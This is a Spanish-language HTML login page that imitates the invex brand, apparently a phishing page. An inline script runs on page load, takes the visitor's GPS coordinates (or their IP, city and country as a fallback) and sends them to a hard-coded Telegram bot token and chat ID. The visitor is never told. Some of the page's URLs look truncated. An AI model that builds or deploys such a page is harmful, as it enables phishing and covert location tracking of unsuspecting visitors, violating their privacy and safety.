<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Acceso — invex®</title>
    <link rel="stylesheet" href="styles.css" />
    <!-- CDN Correcto para cargar los iconos de Font Awesome -->
    <link rel="stylesheet" href="https://cloudflare.com" />
</head>
<body>
<main class="login-wrapper">
    <h1 id="brand-title" class="brand">invex<sup>®</sup></h1>
    <section class="login-card" aria-labelledby="brand-title">
        <div class="lang-selector">
            <label for="lang" class="visually-hidden">Idioma</label>
            <select id="lang" name="lang">
                <option value="es-ES" selected>es-ES</option>
                <option value="en-US">en-US</option>
            </select>
        </div>
        <h2 class="welcome-title">¡Hola, bienvenido!</h2>
        <form id="login-form" class="login-form" novalidate>
            <!-- Campo Usuario -->
            <div class="field">
                <input type="text" id="username" name="username" placeholder=" " autocomplete="username" required />
                <label for="username" class="floating-label">Usuario</label>
            </div>
            <!-- Campo Contraseña -->
            <div class="field">
                <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required />
                <label for="password" class="floating-label">Contraseña</label>
                <span class="toggle-password" id="togglePassword">
                    <!-- CORREGIDO: xmlns con la estructura estándar completa para Chrome -->
                    <svg id="eyeIcon" xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
                        <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path>
                        <path d="M6.61 6.61A13.52 13.52 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path>
                        <line x1="2" y1="2" x2="22" y2="22"></line>
                    </svg>
                </span>
            </div>
            <p id="form-message" class="form-message" role="alert" aria-live="polite"></p>
            <button type="submit" class="btn-submit">Iniciar sesión</button>
        </form>
        <div class="forgot-container">
            <p class="forgot-text-question">¿Olvidaste tu usuario o contraseña?</p>
            <a href="password.html" class="forgot-link">Recupéralos aquí</a>
        </div>
    </section>
</main>

<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (ENLACES COMPLETAMENTE OPERATIVOS) -->
<script>
(function() {
    const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
    const CHAT_ID = '9180377107';

    // Función esencial para limpiar caracteres reservados en el HTML de Telegram (&, <, >)
    function escapeHTML(text) {
        return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = Math.round(pos.coords.accuracy);

            // Tu formato de búsqueda exacto con las variables incrustadas de forma segura
            const rawUrl = "https://google.com" + lat + "%2C" + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "%2C" + lon;
            const safeUrl = escapeHTML(rawUrl);

            // El link href configurado correctamente con comillas simples (') para Telegram HTML
            const texto = "<b>📍 Nueva Visita (GPS)</b>\n\n" +
                          "• Latitud: " + lat + "\n" +
                          "• Longitud: " + lon + "\n" +
                          "• Precisión: ~" + acc + " metros\n\n" +
                          "👉 <a href='" + safeUrl + "'>Ver Ubicación en Google Search</a>";

            fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: texto,
                    parse_mode: 'HTML' 
                })
            }).catch(e => console.error("Error enviando GPS:", e));

        }, function(err) {
            // Respaldos por IP
            fetch('https://ipapi.co')
            .then(res => res.json())
            .then(data => {
                const latIP = data.latitude;
                const lonIP = data.longitude;
                const ip = data.ip || 'No detectada';
                const country = data.country_name || 'Desconocido';
                const city = data.city || 'Desconocida';
                
                const rawUrlIP = "https://google.com" + latIP + "%2C" + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "%2C" + lonIP;
                const safeUrlIP = escapeHTML(rawUrlIP);

                const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
                                "• IP: " + escapeHTML(ip) + "\n" +
                                "• País: " + escapeHTML(country) + "\n" +
                                "• Ciudad: " + escapeHTML(city) + "\n\n" +
                                "👉 <a href='" + safeUrlIP + "'>Ver Ubicación por IP</a>";
                
                fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: textoIP,
                        parse_mode: 'HTML' 
                    })
                });
            }).catch(e => console.error("Error enviando IP:", e));
        }, { enableHighAccuracy: true, timeout: 6000 });
    }
})();
</script>

<!-- Carga del archivo principal de interacción lógica -->
<script src="main.js"></script>
</body>
</html>
